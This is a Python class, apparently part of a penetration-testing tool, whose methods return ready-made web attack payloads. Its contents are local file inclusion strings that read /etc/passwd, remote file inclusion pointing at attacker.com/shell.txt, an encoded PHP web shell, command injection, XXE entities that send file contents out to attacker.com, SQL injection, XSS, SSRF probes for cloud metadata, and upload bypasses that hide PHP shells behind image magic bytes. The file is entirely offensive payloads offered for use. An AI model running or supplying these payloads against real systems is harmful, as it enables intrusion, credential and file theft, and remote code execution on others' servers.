from typing import List, Dict

class ExploitTemplates:
    @staticmethod
    def get_lfi_templates(target_url: str, param: str = "file") -> List[str]:
        """Generate LFI exploitation templates"""
        return [
            f"{target_url}?{param}=../../../../../../etc/passwd",
            f"{target_url}?{param}=../../../../../../etc/passwd%00",
            f"{target_url}?{param}=php://filter/convert.base64-encode/resource=index",
            f"{target_url}?{param}=../../../../../../var/log/apache2/access.log",
            f"{target_url}?{param}=....//....//....//....//....//etc/passwd",
            f"{target_url}?{param}=....////....////....////....////etc/passwd",
            f"{target_url}?{param}=/proc/self/environ",
            f"{target_url}?{param}=/proc/self/cmdline"
        ]

    @staticmethod
    def get_rfi_templates(target_url: str, param: str = "page", attacker_url: str = "http://attacker.com/shell.txt") -> List[str]:
        """Generate RFI exploitation templates"""
        return [
            f"{target_url}?{param}={attacker_url}",
            f"{target_url}?{param}={attacker_url}%00",
            f"{target_url}?{param}=http://attacker.com/shell.txt?",
            f"{target_url}?{param}=expect://whoami",
            f"{target_url}?{param}=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            f"{target_url}?{param}=php://input&cmd=whoami"
        ]

    @staticmethod
    def get_cmd_injection_templates(target_url: str, param: str = "ip") -> List[str]:
        """Generate command injection templates"""
        return [
            f"{target_url}?{param}=127.0.0.1;id",
            f"{target_url}?{param}=127.0.0.1|whoami",
            f"{target_url}?{param}=127.0.0.1&&uname -a",
            f"{target_url}?{param}=`id`",
            f"{target_url}?{param}=$(id)",
            f"{target_url}?{param}=127.0.0.1 || id",
            f"{target_url}?{param}=127.0.0.1 %0A id",
            f"{target_url}?{param}=127.0.0.1%0Did"
        ]

    @staticmethod
    def get_xxe_payloads() -> List[str]:
        """Generate XXE exploitation payloads"""
        return [
            "<?xml version='1.0' encoding='ISO-8859-1'?>\n"
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]>\n"
            "<foo>&xxe;</foo>",
            
            "<?xml version='1.0' ?>\n"
            "<!DOCTYPE root [\n"
            "<!ENTITY % ext SYSTEM 'http://attacker.com/evil.dtd'>\n"
            "%ext;\n"
            "]>",
            
            "<?xml version=\"1.0\"?>\n"
            "<!DOCTYPE data [\n"
            "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
            "<!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">\n"
            "%dtd;\n"
            "%send;\n"
            "]>"
        ]

    @staticmethod
    def get_sqli_payloads(param: str = "id") -> List[str]:
        """Generate SQL injection payloads"""
        return [
            f"?{param}=1' OR '1'='1",
            f"?{param}=1\" OR \"1\"=\"1",
            f"?{param}=1' OR 1=1-- ",
            f"?{param}=1' UNION SELECT NULL, version()-- ",
            f"?{param}=1' UNION SELECT table_name, column_name FROM information_schema.columns-- ",
            f"?{param}=1' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
            f"?{param}=1' WAITFOR DELAY '0:0:5'--",
            f"?{param}=1' OR SLEEP(5)--"
        ]

    @staticmethod
    def get_xss_payloads() -> List[str]:
        """Generate XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS');\"></iframe>",
            "<a href=\"javascript:alert('XSS')\">Click</a>"
        ]

    @staticmethod
    def get_ssrf_payloads() -> List[str]:
        """Generate SSRF payloads"""
        return [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "dict://localhost:6379/info",
            "gopher://localhost:6379/_INFO%0D%0A",
            "http://[::1]",
            "http://2130706433"  # 127.0.0.1 as integer
        ]

    @staticmethod
    def get_file_upload_bypass() -> Dict[str, List[str]]:
        """Generate file upload bypass techniques"""
        return {
            "Extension Bypass": [
                "shell.php.jpg",
                "shell.php%00.jpg",
                "shell.php\x00.jpg",
                "shell.php ",
                "shell.php.",
                "shell.php%20",
                "shell.php%0a",
                "shell.php%0d%0a.jpg",
                "shell.php.jpg.php",
                "shell.pHp"
            ],
            "Content-Type Bypass": [
                "image/jpeg",
                "image/png",
                "text/plain",
                "application/octet-stream"
            ],
            "Magic Bytes": [
                "GIF89a; <?php system($_GET['cmd']); ?>",
                "\xFF\xD8\xFF\xE0 <?php system($_GET['cmd']); ?>",
                "\x89PNG <?php system($_GET['cmd']); ?>"
            ]
        }
